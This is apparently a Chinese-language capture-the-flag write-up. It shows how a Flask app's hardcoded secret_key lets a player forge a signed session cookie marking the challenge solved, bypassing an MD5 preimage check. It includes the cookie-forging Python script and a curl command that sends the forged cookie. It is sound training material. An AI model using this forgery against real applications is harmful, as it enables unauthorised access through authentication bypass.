# md5

## 题目简述

页面要求提交一个字符串，使其 MD5 等于
`826f550caf7b1f9e9026619ef6910410`。`/submit` 命中后只做一件与授权有关的事：把 Flask session 中的 `solved` 设为 `True`，然后跳转到 `/win`；`/win` 仅检查这个布尔值。

源码还把 Flask `secret_key` 硬编码在 `app.py` 中。Flask 默认 session 保存在客户端 Cookie 里，只由该密钥签名而不在服务端存状态，因此可以直接伪造
`{"solved": true}`，无需求 MD5 原像。原目录标签是 Misc，但决定性缺陷是 Web 会话认证绕过，应归入 Web。

## 解题过程

### 确认授权逻辑

关键路由可收敛为：

```python
@app.route("/submit")
def submit():
    value = request.args.get("input")
    if hashlib.md5(value.encode()).hexdigest() == TARGET:
        session["solved"] = True
        return redirect("/win")

@app.route("/win")
def win():
    if session.get("solved"):
        return render_template("win.html")
    return redirect("/")
```

MD5 检查没有参与 flag 计算，也没有产生服务端票据；它只是设置一个客户端可表示的状态。只要能生成有效签名，便可直接满足 `/win` 的唯一条件。

### 生成 Flask session Cookie

从本地 `app.py` 读取硬编码的 `app.secret_key`。不要把源码中与解题无关的外部 webhook 地址复制到脚本、WP 或请求中。

使用 Flask 自己的会话序列化器可以避免猜测签名盐、摘要算法和压缩格式：

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "此处填写 app.py 中的硬编码 secret_key"

serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = serializer.dumps({"solved": True})
print(cookie)
```

在浏览器中把站点的 `session` Cookie 替换为输出值，或直接发送：

```bash
curl -b "session=<生成的 Cookie>" https://<challenge-host>/win
```

服务会验证签名、反序列化出 `solved=True`，随后渲染 `win.html`，其中给出：

```text
UMDCTF{why_did_you_spend_your_time_doing_this}
```

## 方法总结

- 核心技巧：利用公开源码中的 Flask 会话签名密钥，伪造客户端 session 状态绕过哈希原像检查。
- 识别信号：敏感路由只依赖 `session` 字段，应用又使用 Flask 默认客户端 Cookie 且泄露 `secret_key` 时，应优先检查会话伪造。
- 复用要点：不要被页面上的高成本计算问题牵制；先判断它最终授予的权限是否只是可伪造状态。生成 Cookie 时优先复用框架序列化器，避免手工实现细节不一致。
